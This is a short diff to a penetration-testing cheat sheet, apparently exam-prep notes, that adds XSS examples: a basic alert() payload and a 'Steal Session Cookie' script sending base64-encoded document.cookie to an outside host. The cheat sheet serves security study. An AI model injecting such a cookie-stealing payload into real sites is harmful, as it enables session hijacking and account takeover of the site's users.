@@ -184,8 +184,13 @@ WAR
 [Payloads](https://github.com/payloadbox) 
 
 ## XSS
+Basic Payload
 
      <script>alert("XSS")</script>
+     
+Steal Session Cookie
+
+    <script>fetch('https://site.com/page?cookie=' + btoa(document.cookie));</script>
 
 ## SQL Injection 
 [SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
